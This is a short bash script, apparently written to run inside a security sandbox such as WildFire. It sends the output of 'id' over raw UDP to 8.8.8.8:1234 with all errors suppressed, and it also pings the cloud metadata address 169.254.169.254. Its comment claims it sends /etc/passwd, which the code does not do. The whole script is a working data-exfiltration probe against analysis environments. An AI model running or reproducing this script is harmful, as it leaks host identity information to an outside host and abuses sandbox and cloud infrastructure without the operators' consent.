#!/bin/bash
# Send /etc/passwd as raw UDP payload to 8.8.8.8:1234
# WildFire captures the PCAP — payload readable directly, no decoding needed
exec 3<>/dev/udp/8.8.8.8/1234 2>/dev/null && {
    id >&3 2>/dev/null
    exec 3>&-
} 2>/dev/null
echo -n x>/dev/udp/169.254.169.254/9999 2>/dev/null||true
